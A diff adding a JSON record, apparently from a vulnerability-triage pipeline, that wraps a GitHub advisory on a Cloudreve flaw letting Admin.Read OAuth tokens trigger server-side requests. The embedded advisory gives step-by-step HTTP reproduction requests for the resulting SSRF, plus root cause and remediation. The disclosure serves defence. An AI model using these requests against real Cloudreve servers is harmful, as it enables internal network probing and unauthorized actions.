@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/271374756?v=4\", \"events_url\": \"https://api.github.com/users/DavidCarliez/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/DavidCarliez/followers\", \"following_url\": \"https://api.github.com/users/DavidCarliez/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/DavidCarliez/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/DavidCarliez\", \"id\": 271374756, \"login\": \"DavidCarliez\", \"node_id\": \"U_kgDOECzZpA\", \"organizations_url\": \"https://api.github.com/users/DavidCarliez/orgs\", \"received_events_url\": \"https://api.github.com/users/DavidCarliez/received_events\", \"repos_url\": \"https://api.github.com/users/DavidCarliez/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/DavidCarliez/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/DavidCarliez/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/DavidCarliez\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-863\", \"name\": \"Incorrect Authorization\"}, {\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"## Summary\\n\\nCloudreve exposes two admin node test endpoints under the `Admin.Read` OAuth scope. These endpoints accept attacker-controlled node definitions and cause Cloudreve to make outbound server-side network requests. This allows an OAuth client authorized only for `Admin.Read` to trigger operational network actions that should require `Admin.Write`.\\n\\n## Impact\\n\\nAn attacker who obtains an admin-authorized OAuth token with `Admin.Read` but not `Admin.Write` can make the Cloudreve server connect to arbitrary URLs supplied in the request body. This can be used for blind SSRF, internal service probing, and triggering signed Cloudreve slave-style requests to attacker-chosen endpoints.\\n\\n## Affected version\\n\\nVerified in source and runtime on latest master commit `ba2e870bbd17f1918dd2321de861e453f696d6a3` and latest observed tag `4.16.1`.\\n\\n## Technical details\\n\\nThe authenticated admin route group requires only `Admin.Read`:\\n\\n```go\\nauth := v4.Group(\\\"\\\")\\nauth.Use(middleware.LoginRequired())\\nauth.Use(middleware.RequiredScopes(types.ScopeAdminRead))\\nadmin := auth.Group(\\\"admin\\\", middleware.IsAdmin())\\n```\\n\\nThe following routes are registered without `ScopeAdminWrite`:\\n\\n```go\\nnode.POST(\\\"test\\\",\\n    controllers.FromJSON[adminsvc.TestNodeService](adminsvc.TestNodeParamCtx{}),\\n    controllers.AdminTestSlave,\\n)\\nnode.POST(\\\"test/downloader\\\",\\n    controllers.FromJSON[adminsvc.TestNodeDownloaderService](adminsvc.TestNodeDownloaderParamCtx{}),\\n    controllers.AdminTestDownloader,\\n)\\n```\\n\\nBy contrast, node create, update, and delete routes do require `Admin.Write`:\\n\\n```go\\nnode.PUT(\\\"\\\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)\\nnode.PUT(\\\":id\\\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)\\nnode.DELETE(\\\":id\\\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)\\n```\\n\\n`TestNodeService.Test()` parses the attacker-supplied node server and sends a request to it:\\n\\n```go\\nslave, err := url.Parse(service.Node.Server)\\n...\\nres, err := r.Request(\\n    \\\"POST\\\",\\n    routes.SlavePingRoute(slave),\\n    bytes.NewReader(bodyByte),\\n    ...\\n)\\n```\\n\\n`TestNodeDownloaderService.Test()` constructs a downloader from attacker-supplied node settings and invokes its network test method.\\n\\n## Reproduction\\n\\nThe following was verified against a disposable Cloudreve instance built from the affected commit.\\n\\nPrerequisite: an admin user authorizes an OAuth client with `Admin.Read` but not `Admin.Write`.\\n\\n1. Obtain an OAuth access token whose scope is only:\\n\\n```text\\nopenid Admin.Read\\n```\\n\\nThe returned token response contains:\\n\\n```json\\n{\\n  \\\"token_type\\\": \\\"Bearer\\\",\\n  \\\"scope\\\": \\\"openid Admin.Read\\\"\\n}\\n```\\n\\n2. Confirm the token cannot perform an `Admin.Write` node operation:\\n\\n```http\\nPUT /api/v4/admin/node HTTP/1.1\\nAuthorization: Bearer <admin-read-oauth-token>\\nContent-Type: application/json\\n\\n{\\n  \\\"node\\\": {\\n    \\\"name\\\": \\\"deny-control\\\",\\n    \\\"server\\\": \\\"http://127.0.0.1:18080\\\",\\n    \\\"type\\\": \\\"slave\\\",\\n    \\\"slave_key\\\": \\\"poc\\\"\\n  }\\n}\\n```\\n\\nObserved response:\\n\\n```json\\n{\\n  \\\"code\\\": 40089,\\n  \\\"msg\\\": \\\"Insufficient scope: Admin.Write\\\"\\n}\\n```\\n\\n3. Use the same `Admin.Read`-only OAuth token to call the node test endpoint with an attacker-controlled server URL:\\n\\n```http\\nPOST /api/v4/admin/node/test HTTP/1.1\\nAuthorization: Bearer <admin-read-oauth-token>\\nContent-Type: application/json\\n\\n{\\n  \\\"node\\\": {\\n    \\\"id\\\": 124,\\n    \\\"name\\\": \\\"ssrf-poc\\\",\\n    \\\"server\\\": \\\"http://127.0.0.1:18080\\\",\\n    \\\"type\\\": \\\"slave\\\",\\n    \\\"slave_key\\\": \\\"attacker-controlled-key\\\"\\n  }\\n}\\n```\\n\\nObserved Cloudreve response:\\n\\n```json\\n{\\n  \\\"code\\\": 0,\\n  \\\"msg\\\": \\\"\\\"\\n}\\n```\\n\\n4. The canary server at `127.0.0.1:18080` received the backend request:\\n\\n```http\\nPOST /api/v4/slave/ping HTTP/1.1\\nHost: 127.0.0.1:18080\\nUser-Agent: Cloudreve/4.14.0\\nAuthorization: Bearer Cr <hmac-signature>:<timestamp>\\nX-Cr-Node-Id: 124\\nX-Cr-Site-Url: http://127.0.0.1:15212\\nContent-Length: 37\\n\\n{\\\"callback\\\":\\\"http://127.0.0.1:15212\\\"}\\n```\\n\\nThis proves the `Admin.Read`-only OAuth token is denied on a sibling `Admin.Write` route but can still trigger a server-side request to an attacker-selected node URL through the test route.\\n\\n## Root cause\\n\\nThe route group enforces `Admin.Read` by default and relies on per-route `Admin.Write` middleware for operations that mutate state or perform operational side effects. The node test endpoints were omitted from the `Admin.Write` set even though they execute server-side network actions using attacker-supplied configuration.\\n\\n## Remediation\\n\\n- Add `middleware.RequiredScopes(types.ScopeAdminWrite)` to both node test routes.\\n- Consider applying SSRF validation or network egress controls to all admin-supplied test URLs.\\n- Audit other admin test endpoints for read-scoped side effects.\", \"ghsa_id\": \"GHSA-v6w6-358x-2433\", \"github_reviewed_at\": \"2026-07-24T21:50:23Z\", \"html_url\": \"https://github.com/advisories/GHSA-v6w6-358x-2433\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-v6w6-358x-2433\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-24T21:50:23Z\", \"references\": [\"https://github.com/cloudreve/cloudreve/security/advisories/GHSA-v6w6-358x-2433\", \"https://github.com/cloudreve/cloudreve/commit/332a9d800205082a2469e555fd66a63f18d9d5dc\", \"https://github.com/cloudreve/cloudreve/releases/tag/4.17.0\", \"https://github.com/advisories/GHSA-v6w6-358x-2433\"], \"repository_advisory_url\": \"https://api.github.com/repos/cloudreve/cloudreve/security-advisories/GHSA-v6w6-358x-2433\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/cloudreve/cloudreve\", \"summary\": \"Cloudreve Admin.Read OAuth tokens can trigger server-side node test requests\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-24T21:50:25Z\", \"url\": \"https://api.github.com/advisories/GHSA-v6w6-358x-2433\", \"vulnerabilities\": [{\"first_patched_version\": \"4.0.0-20260626022735-332a9d800205\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/cloudreve/Cloudreve/v4\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.0.0-20260626022735-332a9d800205\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/cloudreve/Cloudreve/v3\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.0.0-20250225100611-da4e44b77af4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-v6w6-358x-2433",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/cloudreve/Cloudreve/v3: <= 3.0.0-20250225100611-da4e44b77af4",
+      "github.com/cloudreve/Cloudreve/v4: < 4.0.0-20260626022735-332a9d800205"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/cloudreve/Cloudreve/v3",
+      "github.com/cloudreve/Cloudreve/v4"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-25T19:32:35.260028Z",
+  "provenance": {
+    "content_sha256": "1f7e8978645301d5041d10e6dd7e022ef9f4a0d7039a3d884e7c6d185db78d7e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-24T21:50:23Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-v6w6-358x-2433",
+  "status": "active",
+  "title": "Cloudreve Admin.Read OAuth tokens can trigger server-side node test requests",
+  "updated_at": "2026-07-24T21:50:25Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-v6w6-358x-2433"
+}
